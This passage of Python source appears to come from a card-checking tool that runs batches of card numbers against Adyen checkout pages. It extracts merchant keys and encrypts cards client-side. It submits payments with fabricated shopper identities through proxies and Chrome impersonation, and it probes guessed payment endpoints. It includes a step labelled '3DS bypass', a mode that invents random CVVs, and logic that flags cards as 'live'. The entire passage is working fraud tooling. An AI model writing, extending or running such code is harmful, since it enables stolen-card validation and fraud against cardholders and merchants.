        elif rc == 'ChallengeShopper' or (act_type == 'threeDS2' and subtype == 'challenge'):
            result = await self._challenge_3ds2(session, action, sid, new_sdata, ck, env)

        elif rc == 'RedirectShopper' or act_type == 'redirect':
            result = await self._redirect_3ds(session, action, sid, new_sdata, ck, env)

        if not result:
            return data

        # Check if the 3DS resolution itself returned another 3DS step
        # (fingerprint → challenge escalation)
        new_rc = result.get('resultCode', '')
        if new_rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
            return await self._resolve_3ds(session, result, sid, result.get('sessionData') or new_sdata, ck, env, depth + 1)

        return result

    # ── direct merchant fallback endpoint probing ───────────────────────────
    async def _pay_direct(self, session, encrypted: dict, ck: str, env: str,
                          card_num: Optional[str] = None, ccn_mode: bool = False) -> Optional[dict]:
        endpoints = [
            '/api/payment', '/api/payments', '/api/checkout/payment',
            '/checkout/payment', '/payment/submit', '/adyen/payment',
            '/api/adyen/payments', '/api/pay', '/payments',
        ]
        shopper = _generate_random_shopper()
        pm = {"type": "scheme", "holderName": shopper["full_name"], **encrypted}

        body = {
            "paymentMethod": pm,
            "browserInfo": self._browser_info(),
            "clientStateDataIndicator": True,
            "shopperEmail": shopper["email"],
            "shopperName": {"firstName": shopper["first_name"], "lastName": shopper["last_name"]},
            "telephoneNumber": shopper["phone"],
            "billingAddress": {
                "city": shopper["city"], "country": shopper["country"], "houseNumberOrName": shopper["house_number"],
                "postalCode": shopper["postal_code"], "stateOrProvince": shopper["state"], "street": shopper["street"]
            },
            "deliveryAddress": {
                "city": shopper["city"], "country": shopper["country"], "houseNumberOrName": shopper["house_number"],
                "postalCode": shopper["postal_code"], "stateOrProvince": shopper["state"], "street": shopper["street"]
            },
        }

        hdr = {
            "Content-Type": "application/json; charset=utf-8",
            "Accept": "application/json",
            "Origin": self.url,
            "Referer": self.url,
            "User-Agent": UA,
        }
        for ep in endpoints:
            target = urljoin(self.url, ep)
            try:
                async with session.post(target, json=body, headers=hdr, timeout=8) as r:
                    if r.status_code in (200, 201, 202, 400, 422):
                        d = r.json() if callable(r.json) else r.json
                        if isinstance(d, dict) and ('resultCode' in d or 'pspReference' in d or 'refusalReason' in d):
                            return d
            except Exception:
                continue
        return None

    # ── response parser ─────────────────────────────────────────────────────
    def _parse(self, data: dict, result: dict) -> dict:
        if not isinstance(data, dict):
            result['error'] = 'Non-dict response'
            result['decline_code'] = 'parse_error'
            return result

        psp = data.get('pspReference') or (data.get('action', {}).get('pspReference') if isinstance(data.get('action'), dict) else None)
        if psp:
            result['psp'] = psp

        # Extract receipt / return URL
        action = data.get('action')
        if isinstance(action, dict):
            if action.get('url'):
                result['redirect_url'] = action['url']
                result['3ds_url']      = action['url']
                result['receipt_url']  = action['url']
            if action.get('type'):
                result['action_type']  = action['type']
            if action.get('token'):
                result['action_token'] = action['token']

        if data.get('returnUrl'):
            result['receipt_url'] = data['returnUrl']

        rc = data.get('resultCode', '')
        if not rc and data.get('status'):
            rc = str(data.get('status'))
        if not rc and ('refusalReason' in data or 'refusalReasonCode' in data):
            rc = 'Refused'

        # ── approved ──
        if rc in ('Authorised', 'AuthenticationFinished'):
            result['success'] = True
            result['decline_code'] = 'authorised'
            result['error'] = 'Authorised'
            if not result.get('receipt_url') and data.get('url'):
                result['receipt_url'] = data['url']
            return result

        # ── pending ──
        if rc in ('Received', 'Pending'):
            result['success'] = False
            result['pending'] = True
            result['decline_code'] = 'pending'
            result['error'] = f"Payment {rc}"
            return result

        # ── 3DS ──
        if rc in ('RedirectShopper', 'IdentifyShopper', 'ChallengeShopper'):
            result['decline_code'] = '3ds_required'
            act_type = action.get('type', rc) if isinstance(action, dict) else rc
            result['error'] = f"3DS ({act_type})"
            if result.get('redirect_url'):
                result['error'] += f" - {result['redirect_url']}"
            result['is_live'] = True
            return result

        # ── refused ──
        if rc == 'Refused' or 'refusalReason' in data or 'refusalReasonCode' in data:
            reason = data.get('refusalReason', 'Refused')
            rcode = str(data.get('refusalReasonCode', ''))
            mapped = self.REFUSAL_CODE_MAP.get(rcode) or self.DECLINE_MAP.get(reason, reason.lower().replace(' ', '_') if reason else 'refused')
            result['decline_code'] = mapped
            result['error'] = f"{reason} ({rcode})" if rcode else reason
            result['is_live'] = mapped in self.LIVE_DECLINE
            return result

        # ── Adyen error ──
        if 'errorCode' in data or 'message' in data:
            msg = data.get('message') or data.get('errorCode') or 'error'
            err_code = str(data.get('errorCode', 'error'))
            result['decline_code'] = err_code
            result['error'] = f"{msg} ({err_code})"
            result['is_live'] = False
            return result

        result['decline_code'] = rc.lower() if rc else 'unknown'
        result['error'] = f"Adyen: {rc or 'Unknown'}"
        return result

    async def open_session(self):
        """Open a persistent ChromeSession for batch runs. Must be closed with close_session()."""
        proxies = None
        if self.proxy_data:
            auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
                    if 'username' in self.proxy_data else "")
            purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
            proxies = {"http": purl, "https": purl}
        self._persistent_session = ChromeSession(impersonate="chrome131",
                                                  proxies=proxies, timeout=12)
        await self._persistent_session.__aenter__()
        return self

    async def close_session(self):
        """Close the persistent ChromeSession."""
        if hasattr(self, '_persistent_session') and self._persistent_session:
            try:
                await self._persistent_session.__aexit__(None, None, None)
            except Exception:
                pass
            self._persistent_session = None

    async def hit_ccn(self, card: dict, attempt: int, user_id: int) -> dict:
        """CCN-only hit: encrypts card number + auto-generated expiry, no CVV."""
        t0 = time.time()
        result = dict(
            attempt=attempt, card=card, success=False,
            decline_code=None, response_time=0,
            merchant='Adyen Merchant', proxy_raw=None,
            error=None, raw_response=None, is_live=False, psp=None,
            ccn_mode=True,
        )

        if self.proxy_data:
            result['proxy_raw'] = self.proxy_data.get('raw')

        # Use persistent session if available, else create a one-shot session
        persistent = getattr(self, '_persistent_session', None)

        async def _run(sess):
            cfg = await self._get_config(sess)
            result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
            if cfg.get('amount_value') is not None:
                try:
                    val = int(cfg['amount_value'])
                    cur = cfg.get('amount_currency', 'USD')
                    result['amount'] = f"{cur} {val / 100:.2f}"
                except (ValueError, TypeError):
                    result['amount'] = str(cfg['amount_value'])

            if not cfg.get('adyen'):
                result['error'] = "No Adyen checkout detected on this page"
                result['decline_code'] = 'no_adyen'
                result['response_time'] = round(time.time() - t0, 2)
                return result

            result['pbl_reusable'] = cfg.get('pbl_reusable', True)
            if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
                result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
                result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
                result['response_time'] = round(time.time() - t0, 2)
                return result

            ck = cfg.get('clientKey')
            if not ck:
                result['error'] = "Adyen detected but clientKey not found"
                result['decline_code'] = 'no_client_key'
                result['response_time'] = round(time.time() - t0, 2)
                return result

            env = cfg.get('environment', 'live')

            pk = cfg.get('publicKey')
            if not pk:
                pk = await self._fetch_pubkey(sess, ck, env)
            if not pk:
                result['error'] = f"Cannot fetch pubkey for {ck[:20]}…"
                result['decline_code'] = 'no_pubkey'
                result['response_time'] = round(time.time() - t0, 2)
                return result

            # CSE encrypt — CCN mode: attach synthetic CVV to satisfy merchant CVC validation
            try:
                cse = AdyenCSE(pk)
                cvv = card.get('cvv')
                if not cvv or cvv == '000':
                    cvv = f"{random.randint(1000, 9999):04d}" if str(card['card']).startswith(('34', '37')) else f"{random.randint(100, 999):03d}"
                    card['cvv'] = cvv
                enc = cse.encrypt_card(
                    card['card'], card['month'], card['year'], cvv, use_jwe=cfg.get('use_jwe', False))
            except Exception as e:
                result['error'] = f"CSE failed: {e}"
                result['decline_code'] = 'cse_error'
                result['response_time'] = round(time.time() - t0, 2)
                return result

            sid   = cfg.get('sessionId')
            sdata = cfg.get('sessionData')

            if sid and sdata:
                data = await self._pay_session(
                    sess, enc, sid, sdata, ck, env,
                    att_id=cfg.get('checkoutAttemptId'),
                    card_num=card.get('card'))
            else:
                data = await self._pay_direct(
                    sess, enc, ck, env,
                    card_num=card.get('card'))

            if not data:
                result['error'] = "Adyen session missing — dynamic session required"
                result['decline_code'] = 'no_session'
                result['response_time'] = round(time.time() - t0, 2)
                return result

            # 3DS bypass
            rc = data.get('resultCode', '')
            if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
                result['3ds_attempted'] = True
                result['3ds_type'] = rc
                if sid and sdata:
                    resolved = await self._resolve_3ds(
                        sess, data, sid,
                        data.get('sessionData', sdata),
                        ck, env)
                    if resolved and resolved is not data:
                        data = resolved
                        result['3ds_resolved'] = True

            result['response_time'] = round(time.time() - t0, 2)
            result['raw_response'] = data
            return self._parse(data, result)

        try:
            if persistent:
                return await _run(persistent)
            else:
                proxies = None
                if self.proxy_data:
                    auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
                            if 'username' in self.proxy_data else "")
                    purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
                    proxies = {"http": purl, "https": purl}
                async with ChromeSession(impersonate="chrome131",
                                         proxies=proxies, timeout=7) as sess:
                    return await _run(sess)

        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2)
            result['decline_code'] = 'exception'
            result['error'] = str(ex)[:150]
            return result

    async def hit(self, card: dict, attempt: int, user_id: int) -> dict:
        t0 = time.time()
        result = dict(
            attempt=attempt, card=card, success=False,
            decline_code=None, response_time=0,
            merchant='Adyen Merchant', proxy_raw=None,
            error=None, raw_response=None, is_live=False, psp=None,
        )

        if self.proxy_data:
            result['proxy_raw'] = self.proxy_data.get('raw')

        persistent = getattr(self, '_persistent_session', None)

        async def _run(sess):
            # ── 1. get config ───────────────────────────────────────────
            cfg = await self._get_config(sess)
            result['merchant'] = cfg.get('merchant', 'Adyen Merchant')
            if cfg.get('amount_value') is not None:
                try:
                    val = int(cfg['amount_value'])
                    cur = cfg.get('amount_currency', 'USD')
                    result['amount'] = f"{cur} {val / 100:.2f}"
                except (ValueError, TypeError):
                    result['amount'] = str(cfg['amount_value'])

            if not cfg.get('adyen'):
                result['error'] = "No Adyen checkout detected on this page"
                result['decline_code'] = 'no_adyen'
                result['response_time'] = round(time.time() - t0, 2)
                return result

            result['pbl_reusable'] = cfg.get('pbl_reusable', True)
            if cfg.get('pbl_status') and cfg['pbl_status'] not in ('active', 'open', 'paymentPending'):
                result['error'] = f"Pay by Link is {cfg['pbl_status']} (Already Consumed / Closed)"
                result['decline_code'] = 'link_' + str(cfg['pbl_status']).lower()
                result['response_time'] = round(time.time() - t0, 2)
                return result

            ck = cfg.get('clientKey')
            if not ck:
                result['error'] = "Adyen detected but clientKey not found"
                result['decline_code'] = 'no_client_key'
                result['response_time'] = round(time.time() - t0, 2)
                return result

            env = cfg.get('environment', 'live')

            # ── 2. public key ───────────────────────────────────────────
            pk = cfg.get('publicKey')
            if not pk:
                pk = await self._fetch_pubkey(sess, ck, env)
            if not pk:
                result['error'] = f"Cannot fetch pubkey for {ck[:20]}…"
                result['decline_code'] = 'no_pubkey'
                result['response_time'] = round(time.time() - t0, 2)
                return result

            # ── 3. CSE encrypt ──────────────────────────────────────────
            try:
                cse = AdyenCSE(pk)
                enc = cse.encrypt_card(
                    card['card'], card['month'], card['year'], card['cvv'], use_jwe=cfg.get('use_jwe', False))
            except Exception as e:
                result['error'] = f"CSE failed: {e}"
                result['decline_code'] = 'cse_error'
                result['response_time'] = round(time.time() - t0, 2)
                return result

            # ── 4. submit ───────────────────────────────────────────────
            sid   = cfg.get('sessionId')
            sdata = cfg.get('sessionData')

            if sid and sdata:
                data = await self._pay_session(
                    sess, enc, sid, sdata, ck, env,
                    att_id=cfg.get('checkoutAttemptId'),
                    card_num=card.get('card'))
            else:
                data = await self._pay_direct(
                    sess, enc, ck, env,
                    card_num=card.get('card'))

            if not data:
                result['error'] = "Adyen session missing — dynamic session required"
                result['decline_code'] = 'no_session'
                result['response_time'] = round(time.time() - t0, 2)
                return result

            # ── 5. 3DS bypass ───────────────────────────────────────────
            rc = data.get('resultCode', '')
            if rc in ('IdentifyShopper', 'ChallengeShopper', 'RedirectShopper'):
                result['3ds_attempted'] = True
                result['3ds_type'] = rc
                if sid and sdata:
                    resolved = await self._resolve_3ds(
                        sess, data, sid,
                        data.get('sessionData', sdata),
                        ck, env)
                    if resolved and resolved is not data:
                        data = resolved
                        result['3ds_resolved'] = True

            result['response_time'] = round(time.time() - t0, 2)
            result['raw_response'] = data
            return self._parse(data, result)

        try:
            if persistent:
                return await _run(persistent)
            else:
                proxies = None
                if self.proxy_data:
                    auth = (f"{self.proxy_data['username']}:{self.proxy_data['password']}@"
                            if 'username' in self.proxy_data else "")
                    purl = f"http://{auth}{self.proxy_data['server'].replace('http://', '')}"
                    proxies = {"http": purl, "https": purl}
                async with ChromeSession(impersonate="chrome131",
                                         proxies=proxies, timeout=7) as sess:
                    return await _run(sess)

        except Exception as ex:
            result['response_time'] = round(time.time() - t0, 2)
            result['decline_code'] = 'exception'
            result['error'] = str(ex)[:150]
            return result

